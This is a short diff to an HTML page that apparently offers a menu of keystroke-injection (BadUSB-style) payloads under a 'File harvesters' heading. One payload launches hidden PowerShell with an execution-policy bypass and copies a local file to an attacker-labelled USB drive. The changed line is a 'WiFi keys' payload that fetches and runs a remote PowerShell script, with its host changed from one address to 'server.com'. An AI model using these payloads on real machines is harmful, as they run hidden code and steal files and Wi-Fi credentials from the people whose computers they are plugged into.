@@ -453,7 +453,7 @@ function topFunction() {
                 <ul id="exploit_list">
                     <h3>File harvesters</h3>
                  <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W Hidden -EP Bypass -NoP $SourceFile = &#39;C:\\readme.txt&#39;; $TargetDriveLabel = &#39;pic0wn3d&#39;; $Attempts = 0; $MaxAttempts = 10; while ($Attempts -lt $MaxAttempts) { $Drives = Get-Volume | Where-Object { $_.FileSystemLabel -eq $TargetDriveLabel }; if ($Drives) { $TargetPath = &quot;$($Drives.DriveLetter):\\ &quot;; Copy-Item $SourceFile -Destination $TargetPath -Force; exit }; Start-Sleep -Seconds 1; $Attempts++ }\nDELAY 300\nENTER')"><li>File Copy</li></a>
-<a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W Hidden -EP Bypass -NoP -c &quot;iwr http://aurora.oops.wtf/w.ps1|iex&quot;\nDELAY 300\nENTER')"><li>WiFi keys</li></a>
+<a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W Hidden -EP Bypass -NoP -c &quot;iwr http://server.com/wifikeys.ps1|iex&quot;\nDELAY 300\nENTER')"><li>WiFi keys</li></a>
 
                 </ul>
             </linkblock>
